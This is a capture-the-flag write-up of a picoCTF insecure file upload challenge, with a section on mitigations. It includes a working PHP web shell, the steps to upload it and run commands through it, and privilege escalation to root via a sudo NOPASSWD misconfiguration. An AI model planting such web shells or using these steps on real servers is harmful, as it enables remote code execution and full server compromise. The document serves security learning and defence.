#Whatis  :Insecure File Upload Vulnerability
 
- **Critical Web Application Vulnerability**: Allows attackers to upload malicious files (e.g., PHP scripts) to a server, potentially leading to remote code execution (RCE).
- **How It Works**: Web applications often allow file uploads (e.g., for profile pictures or documents) but fail to properly validate file types, extensions, or content. This lets attackers upload executable scripts (e.g., PHP, ASP) that the server runs when accessed.
- **Impact**: Attackers can gain RCE, enabling command execution, data theft, or server compromise. In this challenge, it allowed uploading a PHP web shell to run commands as `www-data` and escalate privileges to access `/root/flag.txt`.
- **Real-World Risk**: Similar to OWASP A03:2021 (Injection), rated CVSS ~8.8–9.8, as it risks sensitive data (e.g., user credentials, database contents) in systems handling shared or stored files.
- **Challenge Context**: The PHP-based app allowed uploading a `.php` file without sanitization, stored in `/uploads/`, and executed it, granting RCE. A sudo misconfiguration (`NOPASSWD: ALL`) enabled privilege escalation to read the flag.

## How Could It Happen?

Insecure file upload vulnerabilities arise from poor validation in web applications:

- **Lack of Input Validation**: No checks on file extensions, MIME types, or content. For example, the app accepted `shell.php` without verifying it’s an image.
- **Improper File Handling**: Uploaded files are stored in a web-accessible directory (e.g., `/var/www/html/uploads/`) and executed by the server (e.g., PHP interprets `.php` files).
- **Common Scenarios**: Seen in user profile uploaders, content management systems (e.g., WordPress plugins), or file-sharing apps. Attackers upload backdoors to steal data or escalate access.
- **Contributing Factors**: Legacy code, misconfigured servers (e.g., PHP executing `.jpg` files with PHP code), or lack of security reviews. In this challenge, the hint “File upload was not sanitized” confirmed the flaw, and “check sudo -l” pointed to escalation.
- **Real-World Example**: Breaches like the 2017 WordPress plugin exploits, where attackers uploaded malicious PHP files to gain RCE, risking shared data exposure.

#steps_to_identify_vul 

1. **Test File Upload**:
    - Access  URL 
    - Upload a benign file (e.g., `test.jpg`) via the “Upload Profile Picture” form.
    - Check the response (via browser or Network tab, F12) for the uploaded file’s path (e.g., `/uploads/<hash>.jpg`) and confirm it’s accessible (e.g., `http://<host>/uploads/<hash>.jpg`).
2. **Probe for Insecure Handling**:
    - Upload a PHP file (e.g., `shell.php`) with code like `<?php system($_GET['cmd']); ?>`.
    - If the server accepts it and stores it in `/uploads/` (e.g., `/uploads/<hash>.php`), access it with `?cmd=whoami` (e.g., `http://<host>/uploads/<hash>.php?cmd=whoami`).
    - Output like `www-data` confirms RCE, indicating no file type or content validation.
3. **Check Directory Access**:
    - Use `?cmd=ls` to list `/uploads/` contents. If files are listed, the directory is web-accessible, amplifying the risk.
    - Explore parent directories (e.g., `?cmd=ls ..`) to identify sensitive files or misconfigurations.

## Steps Used to Solve the Challenge

1. **Create a PHP Web Shell**:
    - Created `shell.php` with:
        
        ```php
        <?php
        if (isset($_GET['cmd'])) {
            system($_GET['cmd']);
        }
        ?>
        ```
        
    - This script runs commands passed via `?cmd=` (e.g., `whoami`, `ls`).
2. **Upload the Web Shell**:
    - Uploaded `shell.php` via the challenge’s upload form.
    - Noted the server’s response, which provided the file’s path (e.g., `/uploads/picoctf.php` or a hashed name like `<hash>.php`).
3. **Test the Web Shell**:
    - Accessed `http://standard-pizzas.picoctf.net:59747/uploads/picoctf.php?cmd=ls` to list files, confirming RCE.
    - Tested `?cmd=whoami`, which returned `www-data`, verifying command execution.
4. **Explore the Server**:
    - Ran `?cmd=ls -l ..` to check the parent directory (`/var/www/html`), revealing web app files.
    - Tried `?cmd=cat /root/flag.txt`, but got “Permission denied” due to `www-data`’s limited access.
5. **Check Sudo Privileges**:
    - Ran `?cmd=sudo -l`, which showed `(ALL : ALL) NOPASSWD: ALL`, meaning `www-data` could run any command as `root` without a password.
6. **Retrieve the Flag**:
    - Used `?cmd=sudo cat /root/flag.txt` to read the flag (e.g., `picoCTF{example_flag_here}`).
    - Submitted the flag on picoCTF to complete the challenge.

## Tools Used

- **Web Browser**: To access the challenge, upload files, and test the web shell.
- **Developer Tools (F12)**: Inspected Network tab to capture upload responses and file paths.
- **curl**: For cleaner command execution (e.g., `curl "http://<host>/uploads/picoctf.php?cmd=sudo%20cat%20/root/flag.txt"`).
- **Text Editor**: To create `shell.php` (e.g., `nano`, Notepad).

## How to Patch It?

To prevent insecure file upload vulnerabilities in your company’s systems, especially for data storage and sharing:

- **File Type Validation**:
    - Use allowlists to restrict uploads to safe MIME types (e.g., `image/jpeg`, `image/png`) and extensions (`.jpg`, `.png`).
    - Validate file content (e.g., use `libmagic` or `file` command) to ensure files match their claimed type.
    - Example: In PHP, check `$_FILES['file']['type']` and use `getimagesize()` for images.
- **Secure File Storage**:
    - Store uploads outside the web root (e.g., `/var/uploads/` instead of `/var/www/html/uploads/`).
    - Disable script execution in upload directories via server config (e.g., Apache’s `.htaccess` with `php_flag engine off`).
    - Rename files with random, non-executable names (e.g., `<hash>.bin`) and store metadata separately.
- **Web Application Firewall (WAF)**:
    - Deploy a WAF (e.g., ModSecurity, Cloudflare) to block suspicious uploads (e.g., files with `<?php` or executable content).
    - Use rate limiting to detect repeated upload attempts, marking them as suspicious.
- **Least Privilege and Isolation**:
    - Run the web server (e.g., Apache, Nginx) as a low-privilege user (e.g., `www-data`) with minimal access.
    - Use containers (e.g., Docker) with strict permissions to isolate the app.
    - Encrypt sensitive stored data (e.g., AES-256 for files like `flag.txt`) to prevent unauthorized access.
- **Sudo Hardening**:
    - Restrict `sudo` privileges. Avoid `NOPASSWD: ALL` for any user, especially `www-data`.
    - Use `sudo -l` in audits to identify risky configurations. Limit commands to specific, safe ones (e.g., `sudo /bin/ls`).
- **Monitoring and Policies**:
    - Log all file uploads and command executions via SIEM (e.g., Splunk) to detect anomalies.
    - Conduct regular pentests with tools like Burp Suite to test upload endpoints.
    - Enforce policies for secure coding, requiring validation libraries and security training for developers.
- **Additional Best Practices**:
    - Use Content Security Policy (CSP) headers to restrict script execution.
    - Encrypt data in transit (TLS 1.3) for file uploads and downloads.
    - Audit third-party libraries and server configurations to prevent known CVEs.